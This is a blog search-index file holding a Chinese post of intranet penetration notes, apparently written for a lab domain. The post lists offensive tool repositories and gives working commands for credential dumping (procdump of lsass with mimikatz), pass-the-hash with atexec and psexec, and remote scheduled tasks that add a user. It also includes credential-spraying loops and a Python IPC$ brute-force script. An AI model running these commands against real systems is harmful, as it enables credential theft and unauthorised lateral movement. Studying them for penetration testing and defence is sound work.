<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vlunstack靶场(七)</title>
    <link href="/2024/02/25/vlunstack%E9%9D%B6%E5%9C%BA(%E4%B8%83)/"/>
    <url>/2024/02/25/vlunstack%E9%9D%B6%E5%9C%BA(%E4%B8%83)/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透笔记</title>
    <link href="/2023/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1631524721519-05afcd0b-b562-411b-bd85-32df42deadb3.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1631524721519-05afcd0b-b562-411b-bd85-32df42deadb3.png" alt="image.png"></a></p><p>image.png</p><p><a href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a></p><p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><p><a href="https://xenarmor.com/allinone-password-recovery-pro-software">https://xenarmor.com/allinone-password-recovery-pro-software</a></p><p><a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p><p><a href="https://www.freebuf.com/sectool/164507.html">https://www.freebuf.com/sectool/164507.html</a></p><p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p><a href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><p><a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p><p><a href="https://www.cnblogs.com/-qing-/p/10661480.html">https://www.cnblogs.com/-qing-/p/10661480.html</a> Windows渗透测试中wmi的利用</p><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><p><a href="https://pan.baidu.com/s/1Vh4ELTFvyBhv3Avzft1fCw">https://pan.baidu.com/s/1Vh4ELTFvyBhv3Avzft1fCw</a> 提取码：xiao</p><p><a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a></p><p><a href="https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q">https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q</a> 提取码：dtm2</p><p><a href="https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug">https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug</a> 提取码：taqu</p><p><a href="https://github.com/DeEpinGh0st/Erebus">https://github.com/DeEpinGh0st/Erebus</a></p><p><a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></p><p><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a></p><p><a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a></p><p><a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a></p><p><a href="https://github.com/vysecurity/Aggressor-VYSEC">https://github.com/vysecurity/Aggressor-VYSEC</a></p><p><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></p><p><a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a></p><p><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a></p><p><a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a></p><p><a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a></p><p><a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a></p><p><a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a></p><p><a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a></p><p><a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a></p><p><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a></p><p><a href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a></p><p><a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a></p><p><a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a></p><p><a href="https://github.com/vysec/CVE-2018-4878">https://github.com/vysec/CVE-2018-4878</a></p><p><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a></p><p><a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a></p><p><a href="https://github.com/360-A-Team/CobaltStrike-Toolset">https://github.com/360-A-Team/CobaltStrike-Toolset</a></p><p><a href="https://github.com/ars3n11/Aggressor-Scripts">https://github.com/ars3n11/Aggressor-Scripts</a></p><p><a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a></p><p><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></p><p><a href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a></p><p><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a></p><p><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></p><p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p><p><a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a></p><p><a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a></p><p><a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a></p><p><a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a></p><p><a href="https://github.com/oldb00t/AggressorScripts">https://github.com/oldb00t/AggressorScripts</a></p><p><a href="https://github.com/p292/Phant0m_cobaltstrike">https://github.com/p292/Phant0m_cobaltstrike</a></p><p><a href="https://github.com/p292/DDEAutoCS">https://github.com/p292/DDEAutoCS</a></p><p><a href="https://github.com/secgroundzero/CS-Aggressor-Scripts">https://github.com/secgroundzero/CS-Aggressor-Scripts</a></p><p><a href="https://github.com/skyleronken/Aggressor-Scripts">https://github.com/skyleronken/Aggressor-Scripts</a></p><p><a href="https://github.com/tevora-threat/aggressor-powerview">https://github.com/tevora-threat/aggressor-powerview</a></p><p><a href="https://github.com/tevora-threat/PowerView3-Aggressor">https://github.com/tevora-threat/PowerView3-Aggressor</a></p><p><a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a></p><p><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a></p><p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a></p><p><a href="https://github.com/C0axx/AggressorScripts">https://github.com/C0axx/AggressorScripts</a></p><p><a href="https://github.com/offsecginger/AggressorScripts">https://github.com/offsecginger/AggressorScripts</a></p><p><a href="https://github.com/tomsteele/cs-magik">https://github.com/tomsteele/cs-magik</a></p><p><a href="https://github.com/bitsadmin/nopowershell">https://github.com/bitsadmin/nopowershell</a></p><p><a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a></p><p><a href="https://github.com/realoriginal/reflectivepotato">https://github.com/realoriginal/reflectivepotato</a></p><h3 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h3><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p><p>systeminfo 详细信息</p><p>net start 启动服务</p><p>tasklist 进程列表</p><p>schtasks 计划任务</p><h3 id="2-网络信息收集"><a href="#2-网络信息收集" class="headerlink" title="2.网络信息收集"></a>2.网络信息收集</h3><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p><p>ipconfig &#x2F;all 判断存在域-dns</p><p>net view &#x2F;domain 判断存在域</p><p>net time &#x2F;domain 判断主域</p><p>netstat -ano 当前网络端口开放</p><p>nslookup 域名 追踪来源地址</p><h3 id="3-用户信息收集"><a href="#3-用户信息收集" class="headerlink" title="3.用户信息收集"></a>3.用户信息收集</h3><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p><p>系统默认常见用户身份：</p><p>Domain Admins：域管理员（默认对域控制器有完全控制权）</p><p>Domain Computers：域内机器</p><p>Domain Controllers：域控制器</p><p>Domain Guest：域访客，权限低</p><p>Domain Users：域用户</p><p>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</p><p>相关用户收集操作命令：</p><p>whoami &#x2F;all 用户权限</p><p>net config workstation 登录信息</p><p>net user 本地用户</p><p>net localgroup 本地用户组</p><p>net user &#x2F;domain 获取域用户信息</p><p>net group &#x2F;domain 获取域用户组信息</p><p>wmic useraccount get &#x2F;all 涉及域用户详细信息</p><p>net group “Domain Admins” &#x2F;domain 查询域管理员账户</p><p>net group “Enterprise Admins” &#x2F;domain 查询管理员用户组</p><p>net group “Domain Controllers” &#x2F;domain 查询域控制器</p><h3 id="4-凭据信息收集"><a href="#4-凭据信息收集" class="headerlink" title="4.凭据信息收集"></a>4.凭据信息收集</h3><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p><p>计算机用户 HASH，明文获取 <a href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/mimikatz">mimikatz</a>(win)，<a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a>(linux)</p><p>计算机各种协议服务口令获取 <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>(all)，<a href="https://xenarmor.com/allinone-password-recovery-pro-software">XenArmor</a>)(win)</p><p>Netsh WLAN show profiles</p><p>Netsh WLAN show profile name&#x3D;”无线名称” key&#x3D;clear</p><p>1.站点源码备份文件、数据库备份文件等</p><p>2.各类数据库 Web 管理入口，如 PHPMyAdmin</p><p>3.浏览器保存密码、浏览器 Cookies</p><p>4.其他用户会话、3389 和 ipc$连接记录、回收站内容</p><p>5.Windows 保存的 WIFI 密码</p><p>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</p><h3 id="5-探针主机域控架构服务"><a href="#5-探针主机域控架构服务" class="headerlink" title="5.探针主机域控架构服务"></a>5.探针主机域控架构服务</h3><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><p>探针域控制器名及地址信息</p><p>net time &#x2F;domain nslookup ping</p><p>探针域内存活主机及地址信息</p><p><a href="http://www.unixwiz.net/tools/nbtscan.html#download">nbtscan</a> 192.168.3.0&#x2F;24 第三方工具</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 自带内部命令</span><br><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span> <br><br><span class="hljs-attribute">POWERSHELL</span><br></code></pre></td></tr></table></figure><p>nmap masscan 第三方 PowerShell 脚本 nishang empire 等</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#导入模块 nishang</span><br><span class="hljs-built_in">Import-Module</span> .\nishang.psm1<br><span class="hljs-comment">#设置执行策略</span><br><span class="hljs-built_in">Set-ExecutionPolicy</span> RemoteSigned<br><span class="hljs-comment">#获取模块 nishang 的命令函数</span><br><span class="hljs-built_in">Get-Command</span> <span class="hljs-literal">-Module</span> nishang<br><span class="hljs-comment">#获取常规计算机信息</span><br><span class="hljs-built_in">Get-Information</span><br><span class="hljs-comment">#端口扫描（查看目录对应文件有演示语法，其他同理）</span><br><span class="hljs-built_in">Invoke-PortScan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">229.0</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">229.255</span> <span class="hljs-literal">-ResolveHost</span> <span class="hljs-literal">-ScanPort</span><br><span class="hljs-comment">#其他功能：删除补丁，反弹 Shell，凭据获取等</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>探针域内主机角色及服务信息</p><p>利用开放端口服务及计算机名判断</p><p>核心业务机器:</p><p>1.高级管理人员、系统管理员、财务&#x2F;人事&#x2F;业务人员的个人计算机</p><p>2.产品管理系统服务器</p><p>3.办公系统服务器</p><p>4.财务应用系统服务器</p><p>5.核心产品源码服务器（自建 SVN、GIT）</p><p>6.数据库服务器</p><p>7.文件或网盘服务器、共享服务器</p><p>8.电子邮件服务器</p><p>9.网络监控系统服务器</p><p>10.其他服务器（内部技术文档服务器、其他监控服务器等）</p><h3 id="6-横向渗透明文传递-at-schtasks"><a href="#6-横向渗透明文传递-at-schtasks" class="headerlink" title="6.横向渗透明文传递 at&amp;schtasks"></a>6.横向渗透明文传递 at&amp;schtasks</h3><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？</p><p>这里仅介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p><p>获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令</p><p>利用流程</p><p>\1. 建立 IPC 链接到目标主机</p><p>\2. 拷贝要执行的命令脚本到目标主机</p><p>\3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p><p>\4. 删除 IPC 链接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 工作组</span><br>net use \\server\ipc<span class="hljs-variable">$</span><span class="hljs-string">&quot;password&quot;</span> /user:username<br><br><span class="hljs-comment">#域内</span><br>net use \\server\ipc<span class="hljs-variable">$</span><span class="hljs-string">&quot;password&quot;</span> /user:domain\username<br><br><span class="hljs-comment"># 查看文件列表</span><br><span class="hljs-built_in">dir</span> \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\<br><br><span class="hljs-comment"># 下载文件</span><br><span class="hljs-built_in">copy</span> \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\<span class="hljs-number">1</span>.bat <span class="hljs-number">1</span>.bat<br><br><span class="hljs-comment"># 复制文件</span><br><span class="hljs-built_in">copy</span> <span class="hljs-number">1</span>.bat \\xx.xx.xx.xx\C<span class="hljs-variable">$</span><br><br><span class="hljs-comment"># 删除 IPC</span><br>net use \\xx.xx.xx.xx\C<span class="hljs-variable">$</span>\<span class="hljs-number">1</span>.bat /<span class="hljs-built_in">del</span><br><br><span class="hljs-comment"># 查看对方共享</span><br>net view xx.xx.xx.xx<br><br>POWERSHELL<br></code></pre></td></tr></table></figure><p>建立 IPC 常见的错误代码</p><p>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</p><p>（2）51：网络问题，Windows 无法找到网络路径</p><p>（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题</p><p>（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$</p><p>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</p><p>（6）1326：账号密码错误</p><p>（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</p><p>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p><p>建立 IPC 失败的原因</p><p>（1）目标系统不是 NT 或以上的操作系统</p><p>（2）对方没有打开 IPC$共享</p><p>（3）对方未开启 139、445 端口，或者被防火墙屏蔽</p><p>（4）输出命令、账号密码有错误</p><p>[at] &amp; [schtasks]</p><p>●at &lt; Windows2012</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># 建立 ipc 连接：</span><br>net use <span class="hljs-string">\\192.168.3.21\ipc$</span> <span class="hljs-string">&quot;Admin12345&quot;</span> /user:god.org<span class="hljs-string">\ad</span> ministrator<br><br><span class="hljs-comment"># 拷贝执行文件到目标机器</span><br>copy add.bat <span class="hljs-string">\\192.168.3.21\c$</span><br><br><span class="hljs-comment"># add.bat</span><br>net user xiaodi qwe123!@<span class="hljs-comment">#X. /add</span><br><br><span class="hljs-comment">#添加计划任务</span><br>at <span class="hljs-string">\\192.168.3.21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:<span class="hljs-string">\add.bat</span> <br><br>LIVESCRIPT<br></code></pre></td></tr></table></figure><p>●schtasks &gt;&#x3D;Windows2012</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 建立 ipc 连接：</span><br>net use \\192.168.3.32\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> <span class="hljs-string">/user</span><span class="hljs-function">:god.org</span>\administrator<br><br><span class="hljs-comment"># 复制文件到其 C 盘</span><br>copy add.bat \\192.168.3.32\c$ <br><br><span class="hljs-comment"># 创建 adduser 任务 对应执行文件</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/s</span> 192.168.3.32 <span class="hljs-string">/ru</span> <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-string">/tn</span> adduser <span class="hljs-string">/sc</span> DAILY <span class="hljs-string">/tr</span> c:\add.bat <span class="hljs-string">/F</span> <br><br><span class="hljs-comment"># 运行 adduser 任务</span><br>schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/s</span> 192.168.3.32 <span class="hljs-string">/tn</span> adduser <span class="hljs-string">/i</span><br><br><span class="hljs-comment"># 删除 adduser 任务</span><br>schtasks <span class="hljs-string">/delete</span> <span class="hljs-string">/s</span> 192.168.3.21 <span class="hljs-string">/tn</span> adduser <span class="hljs-string">/f</span><br><br>JBOSS-CLI<br></code></pre></td></tr></table></figure><h3 id="7-横向渗透明文-HASH-传递-atexec-impacket"><a href="#7-横向渗透明文-HASH-传递-atexec-impacket" class="headerlink" title="7.横向渗透明文 HASH 传递 atexec-impacket"></a>7.横向渗透明文 HASH 传递 atexec-impacket</h3><p>Impacket官方仓库</p><p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>EXE打包版</p><p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">atexec.exe ./administrator:Admin<span class="hljs-number">12345</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>atexec.exe god/administrator:Admin<span class="hljs-number">12345</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>atexec.exe -hashes :ccef<span class="hljs-number">208</span><span class="hljs-keyword">c</span><span class="hljs-number">6485269</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span>db<span class="hljs-number">2</span>cad<span class="hljs-number">21734</span>fe<span class="hljs-number">7</span> ./administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>LLVM<br></code></pre></td></tr></table></figure><h3 id="8-横向渗透明文-HASH-传递批量利用-综合"><a href="#8-横向渗透明文-HASH-传递批量利用-综合" class="headerlink" title="8.横向渗透明文 HASH 传递批量利用-综合"></a>8.横向渗透明文 HASH 传递批量利用-综合</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment">#批量检测 IP 对应明文连接</span><br><span class="hljs-title class_">FOR</span> /F %%i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> net <span class="hljs-keyword">use</span> \\%%i\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;admin!@#45&quot;</span> /<span class="hljs-symbol">user:</span>administrator<br><br><span class="hljs-comment">#批量检测 IP 对应明文 回显版</span><br><span class="hljs-title class_">FOR</span> /F %%i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> atexec.exe ./<span class="hljs-symbol">administrator:</span>admin!@<span class="hljs-comment">#45@%%i whoami</span><br><br><span class="hljs-comment">#批量检测明文对应 IP 回显版</span><br><span class="hljs-title class_">FOR</span> /F %%i <span class="hljs-keyword">in</span> (pass.txt) <span class="hljs-keyword">do</span> atexec.exe ./<span class="hljs-symbol">administrator:</span>%%i<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> whoami<br><br><span class="hljs-comment"># 批量检测 HASH 对应 IP 回显版</span><br><span class="hljs-title class_">FOR</span> /F %%i <span class="hljs-keyword">in</span> (hash.txt) <span class="hljs-keyword">do</span> atexec.exe -hashes <span class="hljs-symbol">:%%i</span> ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> whoami<br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure><p>案例 4-横向渗透明文 HASH 传递批量利用-升级版</p><p>前期除了收集明文密码HASH等，还收集了用户名，用户名配合密码字典能吃西瓜？</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs nsis">pip install pyinstaller<br><br>pyinstaller -F fuck_neiwang_001.py<br><br>POWERSHELL<br>import os,time<br><br>ips = &#123;<br><br>&#125;<br><br>\<span class="hljs-comment"># net user /domain</span><br><br>users = &#123;<br><br><span class="hljs-string">&#x27;Administrator&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;dbadmin&#x27;</span><br><br>&#125;<br><br>passs = &#123;<br><br>    <br><br>&#125;<br><br>for ip in ips:<br><br>for <span class="hljs-literal">user</span> in users:<br><br>        for mima in passs:<br><br>            <span class="hljs-keyword">exec</span> = <span class="hljs-string">&quot;net use \\&quot;</span> + ip + <span class="hljs-string">&#x27;\ipc$&#x27;</span> + mima + <span class="hljs-string">&#x27; /user:god\\&#x27;</span> + <span class="hljs-literal">user</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + <span class="hljs-keyword">exec</span> + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(<span class="hljs-keyword">exec</span>)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br><br>PYTHON<br></code></pre></td></tr></table></figure><p>案例 1-Procdump+Mimikatz 配合获取</p><p>目标机器上执行：</p><p>procdump -accepteula -ma lsass.exe lsass.dmp</p><p>本机 mimikatz 上执行：</p><p>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full</p><p>●其他工具：</p><p>Pwdump7</p><p>QuarksPwdump</p><p>●HASH破解：</p><p>hashcat -a0 -m 1000 hash file –force</p><p><a href="https://ophcrack.sourceforge.io/tables.php">免费彩虹表下载</a></p><p>案例 2-域横向移动 SMB 服务利用-psexec,smbexec(官方自带)</p><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 端口开放。</p><p>●psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.32</span>\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> /user:administrator<br><br><span class="hljs-comment"># 需要先有 ipc 链接 -s 以 System 权限运行</span><br>psexec \\<span class="hljs-number">192.168.3.32</span> -s cmd <br><br>NGINX<br></code></pre></td></tr></table></figure><p>●psexec 第二种：不用建立 IPC 直接提供明文账户密码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">psexec \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span> -u administrator -p <span class="hljs-title class_">Admin12345</span> -s cmd<br><br><span class="hljs-comment"># 官方 Pstools 无法 采用 hash 连接</span><br><span class="hljs-comment"># 非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span 